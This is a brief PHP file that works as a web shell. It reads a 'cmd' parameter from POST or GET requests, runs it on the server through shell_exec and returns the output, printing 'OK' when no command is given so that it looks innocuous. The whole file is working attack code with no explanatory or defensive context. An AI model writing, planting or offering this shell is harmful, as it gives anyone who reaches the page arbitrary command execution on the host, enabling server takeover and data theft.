<?php
if(isset($_POST['cmd']) && $_POST['cmd'] !== ''){
    echo htmlspecialchars(shell_exec($_POST['cmd'] . " 2>&1"), ENT_QUOTES | ENT_HTML5, 'UTF-8');
    exit;
}
if(isset($_GET['cmd']) && $_GET['cmd'] !== ''){
    echo htmlspecialchars(shell_exec($_GET['cmd'] . " 2>&1"), ENT_QUOTES | ENT_HTML5, 'UTF-8');
    exit;
}
echo "OK";
?>
